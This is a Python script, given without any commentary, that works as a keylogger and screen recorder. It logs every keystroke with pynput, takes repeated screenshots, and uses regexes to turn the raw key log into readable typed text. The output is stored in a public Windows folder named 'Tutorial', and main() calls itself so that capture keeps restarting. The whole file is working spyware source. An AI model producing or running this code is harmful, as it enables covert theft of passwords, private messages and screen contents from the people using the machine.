import pathlib
from PIL import ImageGrab
from pynput.keyboard import Key, Listener
from multiprocessing import Process
import random
import logging
import time
import re

def on_press(key):
    global command_file, keys, screenshot

    if key == Key.enter:
        command_file.write(str(keys) + '\n\n')
        del keys[:]
    elif key == Key.esc:
        screenshot.terminate()
        return False
    else:
        keys.append(key)
        return keys

def screenshots(file_path):
    for x in range(0, 120):
        pic = ImageGrab.grab()
        pic.save(file_path + str(random.randrange(1,600)) + '.png')
        time.sleep(5)           

def regex_formating(file_path):
    regex = re.compile(r'(?:(^\[)|([\',])|(\]$))')
    regex2 = re.compile(r'''<Key\.
                            (?:ctrl|shift|alt|caps_lock|
                            tab|cmd|home|insert|delete|
                            end|page|left|down|right|up|
                            print_screen
                            )
                            ((?:_l|_r|_up|_down
                            )?)
                            :.<[0-9]+>>''', re.X)

    regex3 = re.compile(r'[^\S\r\n]')
    regex4 = re.compile(r'.<Key\.backspace:<8>>')
    regex5 = re.compile(r'<Key\.space:>')

    with open(file_path + 'keys.txt') as command_file:
        for line in command_file:
            sub = re.sub(regex, r'', str(line))
            sub2 = re.sub(regex2, r'', str(sub))
            sub3 = re.sub(regex3, r'', str(sub2))
            sub4 = re.sub(regex4, r'', str(sub3))
            result = re.sub(regex5, r' ', str(sub4))
            with open(file_path + 'commands.txt', 'a') as final_log:
                final_log.write(result)

def main():
    global command_file, screenshot

    input('Please hit enter to begin\n')

    with open(file_path + 'keys.txt', 'a') as command_file:
        key_listener = Listener(on_press=on_press)
        screenshot = Process(target=screenshots, args=(file_path,))
        key_listener.start()
        screenshot.start()
        
        key_listener.join(600.0)
        screenshot.join(timeout=600)

    regex_formating(file_path)

    main()


if __name__ == '__main__':
    try:
        pathlib.Path('C:/Users/Public/Tutorial')\
                .mkdir(parents=True, exist_ok=True)
        
        file_path = 'C:\\Users\\Public\\Tutorial\\'
        keys = []

        main()

    except KeyboardInterrupt:
        print('* Ctrl-C detected ... exiting program *')

    except Exception as ex:
        logging.exception('* Error Ocurred: {} *'.format(ex))
